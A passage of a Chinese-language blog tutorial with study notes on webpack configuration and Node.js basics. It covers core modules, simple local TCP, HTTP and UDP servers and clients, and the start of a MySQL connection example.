class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">//创建一个div节点</span><br>    <span class="hljs-keyword">let</span> eleDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);<br>    <span class="hljs-comment">//在创建的节点中输入内容</span><br>    eleDiv.innerHTML = _.join([<span class="hljs-string">&#x27;hello webpack!&#x27;</span>])<br>    <span class="hljs-comment">//返回这个节点</span><br>    <span class="hljs-keyword">return</span> eleDiv<br>&#125;<br><br><span class="hljs-comment">//将这个div作为body的孩子加入</span><br><span class="hljs-built_in">document</span>.body.appendChild(addDiv());<br></code></pre></td></tr></table></figure><p>然后使用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">npx webpack</span><br></code></pre></td></tr></table></figure><p>打包之后得到main.js文件，也就是更轻量级的优化后的index.js</p><h3 id="1-3-一些配置"><a href="#1-3-一些配置" class="headerlink" title="1.3  一些配置"></a>1.3  一些配置</h3><p>新建一个<code>webpack.config.js</code> 用于进行webpack的基本配置，相当于代替了一些shell命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">const path = require(<span class="hljs-string">&#x27;path&#x27;</span>)<br><br>module.exports = &#123;<br>    <span class="hljs-regexp">//</span> 以后就从这个文件开始打包<br>    entry: <span class="hljs-string">&#x27;./src/index.js&#x27;</span>,<br>    output: &#123;<br>        <span class="hljs-regexp">//</span>出口文件名<br>        filename: <span class="hljs-string">&#x27;bundle.js&#x27;</span>,<br>        <span class="hljs-regexp">//</span>出口文件路径<br>        path: path.resolve(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>),<br>    &#125;,<br>    <span class="hljs-regexp">//</span>打包模式<br>    mode: <span class="hljs-string">&#x27;development&#x27;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>然后在package.json中script中加入</p><p><code>&quot;build&quot;:&quot;webpack&quot;</code>，然后我们使用<code>npm run build</code>就可以实现webpack打包操作</p><p>如果嫌弃每次加载都需要执行run build</p><p>我们就下载webpack-dev-serve</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">npm install webpack-<span class="hljs-built_in">dev</span>-server --<span class="hljs-built_in">save</span>-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>然后在package.json 的scripts中加入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;dev&quot;</span>: <span class="hljs-string">&quot;webpack-dev-server&quot;</span><br></code></pre></td></tr></table></figure><p>然后使用npm run dev开启热加载，就像vue的<code>npm run serve</code></p><p>如果出现了not get的情况</p><p>试试在package.json中加入：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-comment">//server配置</span><br><span class="hljs-symbol">devServer:</span> &#123;<br><span class="hljs-symbol">    static:</span><span class="hljs-string">&quot;./src&quot;</span>,<br>&#125;,<br></code></pre></td></tr></table></figure><h2 id="2-node语法"><a href="#2-node语法" class="headerlink" title="2.node语法"></a>2.node语法</h2><p>node 的控制台交互环境叫REPL</p><h3 id="2-1-控制台（console）"><a href="#2-1-控制台（console）" class="headerlink" title="2.1 控制台（console）"></a>2.1 控制台（console）</h3><p>在cmd中输入node可以进入node控制台，console中有一些方法</p><p>首先是我们熟知的log()</p><p>打印一些数据，就像print</p><p>然后是info，warn，error</p><p>和log()类似，但是在浏览器中的效果不同</p><p>dir()：输出一个对象的信息</p><p>time timeEnd：是一对操作 time开头，timeEnd结尾</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">console</span><span class="hljs-selector-class">.time</span>(<span class="hljs-string">&#x27;time1&#x27;</span>);<br><span class="hljs-selector-tag">for</span>()&#123;<span class="hljs-selector-tag">---</span>&#125;<br><span class="hljs-selector-tag">console</span><span class="hljs-selector-class">.timeEnd</span>(<span class="hljs-string">&#x27;time1&#x27;</span>);<br></code></pre></td></tr></table></figure><p>输入node time 可以查看time1所包裹的这段时间的长度</p><p>trace：输出当前位置的栈信息</p><h3 id="2-2-包管理"><a href="#2-2-包管理" class="headerlink" title="2.2 包管理"></a>2.2 包管理</h3><h4 id="2-2-1-npm"><a href="#2-2-1-npm" class="headerlink" title="2.2.1 npm"></a>2.2.1 npm</h4><p>npm -v查看版本信息</p><p>npm init 初始化出来一个package.json文件</p><p>npm install 会执行安装包的命令，生成node_modules，对于特定的安装包 在其后添加 –save 可以添加到package的依赖中去</p><h4 id="2-2-2-模块加载"><a href="#2-2-2-模块加载" class="headerlink" title="2.2.2 模块加载"></a>2.2.2 模块加载</h4><p>使用require实现模块加载</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">const http</span> = require(<span class="hljs-string">&quot;http&quot;</span>);<br></code></pre></td></tr></table></figure><p>使用export导出模块</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">module.exports</span> = xxx<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="2-3-核心模块"><a href="#2-3-核心模块" class="headerlink" title="2.3 核心模块"></a>2.3 核心模块</h3><p>http模块：</p><p>server中有两个参数 req和res</p><p>res可以通过writeHead函数写响应头部信息：content-type表示让浏览器以什么去<strong>解释传过来的内容</strong></p><p>‘text/plain’表示以纯文本解释</p><p>‘text/html’就代表会用html格式解析，用于传输一些html代码</p><p>服务器的res中有三个事件，都可以通过<code>res.on(&#39;事件名&#39;, function()&#123;&#125;)</code>调用</p><p>data 请求体来到时触发，提供一个chunk，表示接收到的数据</p><p>end 请求体数据传输完毕时候触发，其中函数res.end(xxx)，就是给页面返回内容</p><p>close 用户请求结束的时候触发</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//获取http模块</span><br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-comment">//创建server</span><br><span class="hljs-keyword">const</span> server = http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>)</span>&#123;<br>    res.writeHead(<span class="hljs-number">200</span>,&#123;<br>        <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span><br>    &#125;);<br>    res.end(<span class="hljs-string">&#x27;Hello node&#x27;</span>);<br>&#125;);<br><br><span class="hljs-comment">//创建监听端口</span><br>server.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;listening port 3000&quot;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>这里的createServer相当于是</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">const <span class="hljs-keyword">server</span> = <span class="hljs-built_in">new</span> http.<span class="hljs-keyword">Server</span>();<br><span class="hljs-keyword">server</span>.<span class="hljs-keyword">on</span>(<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-keyword">function</span>(req, res)&#123;&#125;)<br></code></pre></td></tr></table></figure><p>然后我们简单再写一个用户请求的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">let</span> reqData = <span class="hljs-string">&#x27;&#x27;</span>;<br>http.get(&#123;<br>    <span class="hljs-string">&#x27;host&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span>: <span class="hljs-string">&#x27;3000&#x27;</span><br>&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">res</span>) </span>&#123;<br>    <span class="hljs-comment">//返回数据拼接</span><br>    res.on(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-params">chunk</span> =&gt;</span>&#123;<br>        reqData += chunk<br>    &#125;);<br><br>    res.on(<span class="hljs-string">&#x27;end&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(reqData);<br>    &#125;)<br>&#125;).end()<br></code></pre></td></tr></table></figure><p>url模块：</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">const</span> <span class="hljs-built_in">url</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<br></code></pre></td></tr></table></figure><p>有三个方法</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-built_in">url</span>.parse(<span class="hljs-string">&#x27;完整的url&#x27;</span>)=&gt;解析后<br><span class="hljs-built_in">url</span>.format(<span class="hljs-string">&#x27;解析之后的url&#x27;</span>)<br><span class="hljs-built_in">url</span>.resolve(<span class="hljs-string">&#x27;不完整的url&#x27;</span>)=&gt;得到完整的<span class="hljs-built_in">url</span><br></code></pre></td></tr></table></figure><p>querystring模块：</p><p>也是通过require引入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>主要方法<br>querystring.parse();<span class="hljs-regexp">//</span>类似JSON.parse<br>querystring.stringify();<span class="hljs-regexp">//</span>类似JSON.stringify<br></code></pre></td></tr></table></figure><p>尝试一下，这个模块是对查询字符串进行操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br><span class="hljs-keyword">let</span> str = <span class="hljs-string">&#x27;KeyWord = node.js&amp;name = huruji&#x27;</span>;<br><span class="hljs-keyword">let</span> obj = querystring.parse(str);<br><span class="hljs-built_in">console</span>.log(obj);<br><br><span class="hljs-comment">//得到一个对象</span><br>[<span class="hljs-built_in">Object</span>: <span class="hljs-literal">null</span> prototype] &#123; <span class="hljs-string">&#x27;KeyWord &#x27;</span>: <span class="hljs-string">&#x27; node.js&#x27;</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;huruji&#x27;</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="2-4常用模块"><a href="#2-4常用模块" class="headerlink" title="2.4常用模块"></a>2.4常用模块</h3><h4 id="2-4-1-util"><a href="#2-4-1-util" class="headerlink" title="2.4.1 util"></a>2.4.1 util</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">util.inspect()<span class="hljs-regexp">//</span>写成反序列化的字符串<br>util.format()<span class="hljs-regexp">//</span>返回可以使用占位符的字符串，像c语言的printf<br>util.log()<span class="hljs-regexp">//</span>类似console.log但是带有时间戳<br></code></pre></td></tr></table></figure><h4 id="2-4-2-path"><a href="#2-4-2-path" class="headerlink" title="2.4.2 path"></a>2.4.2 path</h4><p>提供了一系列处理文件路径的工具</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-comment">//dirname是当前文件夹</span><br><span class="hljs-keyword">let</span> outputPath = path.join(__dirname,<span class="hljs-string">&#x27;node&#x27;</span>,<span class="hljs-string">&#x27;node.js&#x27;</span>)<br><span class="hljs-comment">//显示扩展名</span><br><span class="hljs-keyword">let</span> ext = path.extname(outputPath)<br><span class="hljs-comment">//转成对象形式</span><br><span class="hljs-keyword">let</span> obj = path.parse(outputPath)<br><span class="hljs-comment">//将对象形式转成完整形式</span><br><span class="hljs-keyword">let</span> fpath = path.format(obj)<br><span class="hljs-built_in">console</span>.log(outputPath);<br><span class="hljs-built_in">console</span>.log(ext);<br><span class="hljs-built_in">console</span>.log(obj);<br><span class="hljs-built_in">console</span>.log(fpath);<br></code></pre></td></tr></table></figure><p>得到的打印结果</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">D:<span class="hljs-symbol">\新</span>建文件夹<span class="hljs-symbol">\文</span>件<span class="hljs-symbol">\n</span>odejs<span class="hljs-symbol">\v</span>ueproject<span class="hljs-symbol">\s</span>rc<span class="hljs-symbol">\n</span>ode<span class="hljs-symbol">\n</span>ode.js<br>.js<br>&#123;<br>  root: &#x27;D:<span class="hljs-symbol">\\</span>&#x27;,<br>  dir: &#x27;D:<span class="hljs-symbol">\\</span>新建文件夹<span class="hljs-symbol">\\</span>文件<span class="hljs-symbol">\\</span>nodejs<span class="hljs-symbol">\\</span>vueproject<span class="hljs-symbol">\\</span>src<span class="hljs-symbol">\\</span>node&#x27;,<br>  base: &#x27;node.js&#x27;,<br>  ext: &#x27;.js&#x27;,<br>  name: &#x27;node&#x27;<br>&#125;<br>D:<span class="hljs-symbol">\新</span>建文件夹<span class="hljs-symbol">\文</span>件<span class="hljs-symbol">\n</span>odejs<span class="hljs-symbol">\v</span>ueproject<span class="hljs-symbol">\s</span>rc<span class="hljs-symbol">\n</span>ode<span class="hljs-symbol">\n</span>ode.js<br></code></pre></td></tr></table></figure><h4 id="2-4-3-dns"><a href="#2-4-3-dns" class="headerlink" title="2.4.3 dns"></a>2.4.3 dns</h4><p>顾名思义就是用于DNS解析的模块</p><p>resolve：解析为一个指定类型的数组</p><p>lookup：返回第一个被发现的地址</p><p>reverse：通过ip解析域名</p><h2 id="3-网络开发"><a href="#3-网络开发" class="headerlink" title="3.网络开发"></a>3.网络开发</h2><p>注意涉及跨域问题的时候，<strong>前后端都要开启跨域允许</strong></p><h3 id="开启跨域"><a href="#开启跨域" class="headerlink" title="开启跨域"></a>开启跨域</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>express框架<br>res.header(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="hljs-string">&#x27;*&#x27;</span>); <span class="hljs-regexp">//</span> 设置允许来自哪里的跨域请求访问（值为*代表允许任何跨域请求，但是没有安全保证）<br><span class="hljs-regexp">//</span>http服务器设置跨域<br>res.setHeader(<span class="hljs-string">&quot;Access-Control-Allow-Origin&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-1-tcp服务器"><a href="#3-1-tcp服务器" class="headerlink" title="3.1 tcp服务器"></a>3.1 tcp服务器</h3><p>首先看看服务器端，主要是创建服务器。还有一些socket的相关事件，比如发送数据获取数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>);<br><br><span class="hljs-comment">//创建服务器</span><br><span class="hljs-keyword">let</span> server = net.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">socket</span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;创建了tcp服务器&quot;</span>);<br>    <span class="hljs-comment">//设置最大连接数</span><br>    server.maxConnections = <span class="hljs-number">3</span>;<br>    server.getConnections(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, count</span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;链接数量是&#x27;</span>+count);<br>    &#125;)<br><br>    <span class="hljs-comment">//获取客户端数据</span><br>    socket.on(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(data.toString());<br>    &#125;)<br><br>    <span class="hljs-comment">//发送数据</span><br>    <span class="hljs-keyword">let</span> message = <span class="hljs-string">&#x27;client the server address is &#x27;</span>+ <span class="hljs-built_in">JSON</span>.stringify(server.address())<br>    socket.write(message,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">let</span> writeSize = socket.bytesWritten;<br>    &#125;)<br>&#125;)<br><br><span class="hljs-comment">//设置监听端口</span><br>server.listen(<span class="hljs-number">8081</span>,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;server in listening&#x27;</span>);<br>&#125;)<br><span class="hljs-comment">//链接时触发</span><br>server.on(<span class="hljs-string">&#x27;connection&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;connect add&#x27;</span>);<br>&#125;)<br><span class="hljs-comment">//出错时触发</span><br>server.on(<span class="hljs-string">&#x27;error&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;)<br><span class="hljs-comment">//关闭</span><br>server.on(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;server close&#x27;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>然后我们也可以创建服务端</p><p>使用connect链接到服务器的端口</p><p>也是使用write发送数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>);<br><span class="hljs-comment">//创建客户端</span><br><span class="hljs-keyword">let</span> client = <span class="hljs-keyword">new</span> net.Socket();<br><br>client.connect(<span class="hljs-number">8081</span>,<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;connect the server&quot;</span>);<br>&#125;);<br><br><span class="hljs-comment">//发送数据</span><br>client.write(<span class="hljs-string">&#x27;message from client&#x27;</span>)<br><br><span class="hljs-comment">//监听data事件,获取返回数据</span><br>client.on(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;the data is&quot;</span> + data.toString());<br>&#125;)<br></code></pre></td></tr></table></figure><h3 id="3-2-http服务器"><a href="#3-2-http服务器" class="headerlink" title="3.2 http服务器"></a>3.2 http服务器</h3><p>设置跨域使用setHeader</p><p>使用我们前面的http模块创建，其实我们之前已经创建过了</p><p>我们现在使用fs模块实现文件的读取</p><p>fs.readFileSync读取文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//获取http模块</span><br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>)<br><span class="hljs-comment">//获取文件读取模块</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> server = http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>    <span class="hljs-comment">//响应头部书写</span><br>    res.writeHead(<span class="hljs-number">200</span>, &#123;<br>        <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span><br>    &#125;);<br><br>    <span class="hljs-keyword">var</span> data = fs.readFileSync(<span class="hljs-string">&#x27;D:\\新建文件夹\\文件\\nodejs\\vueproject\\dist\\index.html&#x27;</span>)<br>    <span class="hljs-comment">//响应数据</span><br>    res.write(data)<br>    res.end();<br>&#125;)<br><span class="hljs-comment">//读入数据</span><br><br><br><br>server.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;listening port 3000&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>我们还可以根据url中用户请求的不同资源设置不同的<code>content-type</code></p><p>第一 获取文件相对路径</p><p><code>let filePath = &#39;.&#39; + url.parse(req.url).pathname;</code></p><p>用exist检查文件是否存在</p><p>使用<code>extname(filePath)</code>获取扩展名，根据扩展名选择不同的content-type</p><h3 id="3-3-UDP服务器"><a href="#3-3-UDP服务器" class="headerlink" title="3.3 UDP服务器"></a>3.3 UDP服务器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> dgram = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dgram&#x27;</span>);<br><br><span class="hljs-keyword">const</span> socket = dgram.createSocket(<span class="hljs-string">&#x27;udp4&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">msg, rinfo</span>) </span>&#123;<br>    socket.on(<span class="hljs-string">&#x27;message&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">msg, rinfo</span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(msg.toString());<br>    &#125;)<br>&#125;)<br><br><span class="hljs-comment">//绑定端口</span><br>socket.bind(<span class="hljs-number">41234</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;bind 41234&#x27;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>其中我们把rinfo打印出来，发现是传输信息的一些信息</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123; <span class="hljs-selector-tag">address</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, family: <span class="hljs-string">&#x27;IPv4&#x27;</span>, port: <span class="hljs-number">61547</span>, size: <span class="hljs-number">9</span> &#125;<br></code></pre></td></tr></table></figure><p>客户端：使用buffer字节传输</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">const</span> dgram = require(<span class="hljs-string">&#x27;dgram&#x27;</span>);<br><span class="hljs-keyword">const</span> socket = dgram.createSocket(<span class="hljs-string">&#x27;udp4&#x27;</span>)<br><br><span class="hljs-comment">//设定字节传输内容</span><br>let <span class="hljs-keyword">message</span> = new Buffer(<span class="hljs-string">&#x27;hello udp&#x27;</span>)<br>socket.send(<span class="hljs-keyword">message</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">message</span>.length,<span class="hljs-number">41234</span>,<span class="hljs-string">&#x27;localhost&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="4-数据库开发"><a href="#4-数据库开发" class="headerlink" title="4.数据库开发"></a>4.数据库开发</h2><h3 id="4-1-mysql"><a href="#4-1-mysql" class="headerlink" title="4.1 mysql"></a>4.1 mysql</h3><p>mysql是经典的关系型数据库，node.js 提供了操作它的模块</p><p>首先使用<code>npm install mysql</code></p><p>然后使用createConnection创建链接，传入基本配置对象，有host user password &amp; database（需要链接的数据库名称）</p><p>然后是connect函数判断链接是否成功，成功可以得到一个链接线程id</p><p>我们还可以终止链接：</p><p>使用connection.end方法（可以正常终止一个链接）</p><p>使用connection.destory方法（立即终止链接，直接终结底层套接字）-不推荐</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br><br><span class="hljs-comment">//创建链接</span><br><span class="hljs-keyword">const</span> connection = mysql.createConnection(&#123;<br>    <span class="hljs-comment">//传入链接对象</span><br>    <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-attr">user</span>: <span 